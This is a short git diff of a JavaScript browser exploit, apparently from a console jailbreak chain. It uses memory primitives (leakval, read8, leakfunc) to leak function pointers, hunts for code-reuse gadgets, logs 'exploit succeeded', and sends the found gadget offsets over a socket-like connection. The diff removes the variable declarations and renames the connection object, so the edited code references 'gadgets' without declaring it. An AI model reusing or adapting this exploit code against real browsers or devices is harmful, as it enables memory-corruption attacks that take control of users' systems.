@@ -142,8 +142,6 @@ window.stage2 = function() {
     }
 }
 
- var gadgets = {}; 
-
 window.stage2_ = function() {
     p = window.prim;
     print ("[+] exploit succeeded");
@@ -154,7 +152,6 @@ window.stage2_ = function() {
         var fptr_store = p.leakval(func);
         return (p.read8(fptr_store.add32(0x18))).add32(0x40);
     }
- gadgetconn = 0;
 
     var parseFloatStore = p.leakfunc(parseFloat);
     var parseFloatPtr = p.read8(parseFloatStore);
@@ -317,9 +314,9 @@ window.stage2_ = function() {
         }
         if (!gadgets_to_find && !slowpath_jop) {
             log("found gadgets");
-            if (gadgetconn)
-                gadgetconn.onopen = function(e){
-                    gadgetconn.send(JSON.stringify(gadgetoffs));
+            if (gadgets)
+                gadgets.onopen = function(e){
+                    gadgets.send(JSON.stringify(gadgetoffs));
                 }
                 setTimeout(donecb, 50);
         } else {
